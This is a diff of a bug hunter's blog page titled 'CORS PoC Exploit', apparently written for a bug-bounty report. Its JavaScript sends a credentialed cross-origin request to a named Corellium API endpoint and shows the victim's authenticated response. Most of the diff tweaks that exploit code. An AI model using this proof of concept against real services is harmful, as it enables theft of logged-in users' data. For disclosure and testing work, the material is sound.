@@ -6,15 +6,15 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="function cors() {             var xhttp &#x3D; new XMLHttpRequest();                 xhttp.onreadystatechange &#x3D; function() {                     if (this.readyState &#x3D;&#x3D; 4 &amp;&amp; this.statu">
+    <meta name="description" content="function cors() {             var xhttp &#x3D; new XMLHttpRequest();                 xhttp.onreadystatechange &#x3D; function() {                     document.getElementById(&quot;demo&quot;).innerH">
 <meta property="og:type" content="website">
 <meta property="og:title" content="k3mloldeblog">
 <meta property="og:url" content="https://k3mlol.github.io/demo/corellium_cros.html">
 <meta property="og:site_name" content="k3mloldeblog">
-<meta property="og:description" content="function cors() {             var xhttp &#x3D; new XMLHttpRequest();                 xhttp.onreadystatechange &#x3D; function() {                     if (this.readyState &#x3D;&#x3D; 4 &amp;&amp; this.statu">
+<meta property="og:description" content="function cors() {             var xhttp &#x3D; new XMLHttpRequest();                 xhttp.onreadystatechange &#x3D; function() {                     document.getElementById(&quot;demo&quot;).innerH">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2020-10-26T03:04:47.480Z">
-<meta property="article:modified_time" content="2020-10-26T03:04:47.480Z">
+<meta property="article:published_time" content="2020-10-26T03:15:47.954Z">
+<meta property="article:modified_time" content="2020-10-26T03:15:47.954Z">
 <meta property="article:author" content="k3mlol">
 <meta property="article:tag" content="blog">
 <meta property="article:tag" content="bug hunter">
@@ -112,9 +112,7 @@
          function cors() {
             var xhttp = new XMLHttpRequest();
                 xhttp.onreadystatechange = function() {
-                    if (this.readyState == 4 && this.status == 200) {
-                        document.getElementById("emo").innerHTML = alert(this.responseText);
-            }
+                    document.getElementById("demo").innerHTML = alert(this.responseText);
          };
          xhttp.open("GET", "https://app.corellium.com/api/v1/roles", true);
          xhttp.withCredentials = true;
@@ -124,7 +122,6 @@
    <meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="k3mloldeblog" type="application/atom+xml">
 </head>
    <body>
-      <center>
       <h2>CORS PoC Exploit </h2>
       <h3>Show full content of page</h3>
       <div id="demo">
